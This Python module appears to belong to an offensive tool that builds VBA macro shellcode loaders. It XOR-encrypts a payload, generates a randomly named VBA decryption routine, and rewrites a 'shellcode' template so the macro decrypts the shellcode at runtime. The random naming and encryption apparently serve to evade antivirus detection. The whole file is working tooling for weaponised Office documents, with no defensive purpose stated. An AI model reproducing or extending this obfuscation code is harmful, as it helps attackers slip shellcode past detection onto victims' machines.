import random
import string
from utils.utils import bytes_to_vba
import os
from itertools import cycle

class XOREncrypt:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(16)

    def compilerOptions(self):
        return []

    def imports(self):
        return []

    def codeblock(self):
        return """
Function {name}(ciphertext() As Byte) As Byte()
    Dim i As Long, n as Long
    {key}
    Dim plaintext() as Byte

    n = Ubound(ciphertext)
    ReDim plaintext(0 To n)

    For i = 0 To n
        plaintext(i) = ciphertext(i) Xor key(i Mod {keyLength})
    Next i

    {name} = plaintext
End Function
""".format(name = self.name, key=bytes_to_vba(self.key, 'key'), keyLength=len(self.key))

    def encode(self, plaintext):
        self.ciphertextSize = len(plaintext)
        return bytes(plaintext[i] ^ self.key[i % len(self.key)] for i in range(0, len(plaintext)))

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')